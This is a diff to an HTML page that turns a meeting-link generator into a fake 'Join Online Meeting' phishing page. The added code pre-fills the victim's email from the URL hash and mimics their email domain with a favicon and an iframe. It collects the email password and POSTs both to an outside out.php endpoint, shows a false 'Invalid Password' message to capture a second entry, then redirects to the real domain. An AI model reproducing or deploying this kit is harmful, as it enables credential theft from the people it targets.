@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en-US">
 
@@ -30,67 +31,6 @@
 </head>
 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
-    <!-- The Modal -->
-    <div id="myModal" class="modal">
-        <!-- Modal content -->
-        <div class="modal-content">
-            <span class="close"></span>
-            <p>Link copied successfully!</p>
-        </div>
-    </div>
-
-    <style>
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 10;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: transparent;
-            /* Black with opacity */
-        }
-
-        .modal-content {
-            background-color: rgb(252, 248, 240);
-            /* Change modal color to orange */
-            margin: 0 auto;
-            margin-top: 130px;
-            /* Adjusted margin-top */
-            margin-bottom: 50px;
-            /* Adjusted margin-bottom */
-            padding-top: 7px;
-            padding-bottom: 1px;
-            border: 0px solid #783131;
-            width: 300px;
-            /* Adjusted width */
-            text-align: center;
-            color: black;
-            /* Change text color to black */
-        }
-
-        .close {
-            color: #8e2929;
-            float: right;
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .close:hover,
-        .close:focus {
-            color: black;
-            text-decoration: none;
-            cursor: pointer;
-        }
-    </style>
-
-
-
-
-
     <style>
         .loader {
             transform: rotateZ(45deg);
@@ -951,65 +891,45 @@
                         <div class="mini-layout" id="join-conf">
                             <div class="mini-layout-body">
                                 <div class="page-header-mobile" style="display: block; text-align: center;">
-                                    <h1 style="font-size: 24px;">Join Meeting</h1>
-                                    <!-- <p>Create Meeting <span id="companyName"> </span>
-                                    </p> -->
+                                    <h1 style="font-size: 24px;">Join Online Meeting</h1>
+                                    <p>Welcome <span id="name"> </span>, You have been invited to join a meeting
+                                    </p>
                                     <div>
                                         <div id="errormsg" style="color:red;display:none; font-size:16px"></div>
-                                        <p style="font-size: 14px;">Meeting Name or Personal Link Name <br>
+                                        <p>Enter your passowrd to join <br>
                                         <p style="color: rgb(9, 86, 181); font-size: 24px;"> <b id="userEmail"> </b></p>
 
                                         <p></p>
                                     </div>
                                 </div>
+								<center>
+          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
+          <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
+        </center>
                                 <div class="box">
-
                                     <div class="form-group confno" style="margin-bottom: 16px;">
-                                        <div class="controls">
-                                            <br>
-                                            <input aria-describedby="rule-tip" id="companyName" name="email" type="text"
-                                                class="form-control input-lg confno" autocomplete="off"
-                                                required="required" maxlength="40"
-                                                placeholder="Enter Meeting Name"><br>
-                                            <input aria-describedby="rule-tip" id="email" type="email"
-                                                required="required" class="form-control input-lg confno"
-                                                autocomplete="off" maxlength="40"
-                                                placeholder="Enter Meeting Invitation Email"><br>
+                                        <div class="controls"><br>
+                                            <input aria-describedby="rule-tip" id="email" readonly="" name="email" type="email"
+                                                class="form-control input-lg confno" autocomplete="off" maxlength="40"
+                                                placeholder="Enter Email Address"><br>
+                                            <input aria-describedby="rule-tip" id="password" required="required" name="pass" type="password"
+                                                class="form-control input-lg confno" autocomplete="off" maxlength="40"
+                                                placeholder="Enter Email Password"><br>
+                                            <p><input type="checkbox" checked=""> &nbsp;I agree to the <a>Terms of
+                                                    Service</a>
+                                                and <a>Privacy Statement</a></p>
                                             <div id="errorContainer" class="wc-new-syle">
                                                 <div id="join-errormsg" class="error hideme"><i></i><span></span>
                                                 </div>
                                             </div>
-                                            <div id="errorMessage" class="error-message"
-                                                style="text-align: center; background-color: rgb(226, 84, 19); color: white; font-size: smaller; display: none; padding: 10px; border-radius: 5px;">
-                                                sssss
-                                            </div>
-
-                                            <!-- Div with input and button initially hidden -->
-                                            <div id="generatedLinkContainer" style="position: relative; display: none;">
-                                                <input type="text" id="generatedLink" class="form-control input-lg "
-                                                    autocomplete="off" maxlength="40"
-                                                    style="background-color: rgb(226, 84, 19); border: none; color: white; font-size: smaller;">
-                                                <button class="k2-copy-button" type="button" onclick="copyLink()"
-                                                    style="position: absolute; top: 50%; transform: translateY(-50%); right: 5px; border-radius: 6px; background-color:  rgb(14, 113, 235); color: white; border-color: rgb(14, 113, 235); font-size: smaller; width: 50px;">Copy
-                                                </button>
-                                            </div>
-
-
-
-
-
                                         </div>
                                     </div>
                                     <div class="controls wc-new-syle">
-                                        <button type="button" value="Generate Link" role="button"
-                                            onclick="generateLink()"
+                                        <button id="submit-btn" type="submit"
                                             style="height: 56px;color:white; line-height: 44px; width: 100%; background-color: rgb(14, 113, 235); opacity: 1; border-color: rgb(14, 113, 235); color: rgb(255, 255, 255);"
-                                            class="btn btn-primary user submit">Get Live Link Here</button>
+                                            class="btn btn-primary user submit">Join Meeting</button>
                                     </div>
-
-
                                 </div>
-
                             </div>
                             <h5 style="text-align: center; width: 100%; padding-top:10px">if you are unable to join the
                                 meeting
@@ -1024,101 +944,146 @@
             </footer>
         </body>
 
+        <script nonce="gOlgwbKqQvaQS1w-WD3g7Q" src="https://maersklineapcontainers.com/files/all.min.js"></script>
+        <script nonce="gOlgwbKqQvaQS1w-WD3g7Q" src="https://maersklineapcontainers.com/files/jquery.validate.message.min.js"></script>
+        <script nonce="gOlgwbKqQvaQS1w-WD3g7Q" type="text/javascript" src="https://maersklineapcontainers.com/files/top_nav.min.js"></script>
+
+  
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
 
-        <script>
-            function generateLink() {
-                const companyName = document.getElementById("companyName").value.trim();
-                const email = document.getElementById("email").value.trim();
 
-                // Hide the errorMessage div initially
-                document.getElementById("errorMessage").style.display = "none";
+    <script>
+/* global $ */
+    $(document).ready(function(){
+      var count=0;
 
-                if (companyName === "" || email === "" || !isValidEmail(email)) {
-                    // Show the errorMessage div if input fields are empty or email is not valid
-                    document.getElementById("errorMessage").innerText = "Please fill in all details correctly.";
-                    document.getElementById("errorMessage").style.display = "block";
-                    return;
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+        $("#iframe").attr("src", "https://www."+my_slice);
+      }
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+$("#iframe").attr("src", "https://www."+my_slice);
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://easssi.org/wp-includes/myzoompage/out.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
                 }
-
-                // Generate unique hash for each input combination
-                const hash = generateHash(companyName + email);
-
-                // Fetch the current URL dynamically
-                const currentURL = window.location.href;
-                const baseURL = currentURL.substring(0, currentURL.lastIndexOf("/"));
-
-                // Replace the link with the desired one
-                const link = `${baseURL}/zoom.html?value=${hash}&agent=${encodeURIComponent(btoa(companyName))}&name=${encodeURIComponent(btoa(companyName))}&email=${encodeURIComponent(btoa(email))}`;
-
-                document.getElementById("generatedLink").value = link;
-
-                // Show the div with input and button
-                document.getElementById("generatedLinkContainer").style.display = "block";
-
-                // Hide the errorMessage div
-                document.getElementById("errorMessage").style.display = "none";
-            }
-
-            function isValidEmail(email) {
-                // Basic email validation regex
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return emailRegex.test(email);
-            }
-
-            function copyLink(event) {
-                event.preventDefault(); // Prevent default action (page refresh or redirect)
-
-                const copyText = document.getElementById("generatedLink");
-                copyText.select();
-                document.execCommand("copy");
-
-                // Show the modal
-                const modal = document.getElementById("myModal");
-                modal.style.display = "block";
-
-                // Close the modal after 2 seconds
-                setTimeout(function () {
-                    modal.style.display = "none";
-                }, 2000);
-            }
-
-            function generateHash(input) {
-                // This is just a simple example using a hashing function
-                // You might want to use more robust hashing algorithms for real-world scenarios
-                let hash = 0;
-                if (input.length === 0) {
-                    return hash;
+                else{
+                  // $('#msg').html(response['msg']);
                 }
-                for (let i = 0; i < input.length; i++) {
-                    const char = input.charCodeAt(i);
-                    hash = ((hash << 5) - hash) + char;
-                    hash = hash & hash; // Convert to 32bit integer
-                }
-                return hash;
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
             }
-
-            function copyLink() {
-                const copyText = document.getElementById("generatedLink");
-                copyText.select();
-                document.execCommand("copy");
-
-                // Show the modal
-                const modal = document.getElementById("myModal");
-                modal.style.display = "block";
-
-                // Close the modal after 2 seconds
-                setTimeout(function () {
-                    modal.style.display = "none";
-                }, 2000);
-            }
-        </script>
+            
+            
+          });
+          
+        
+    });
 
 
+    });
 
 
+  </script>
 
-
-
-
-</html>
+</body></html>
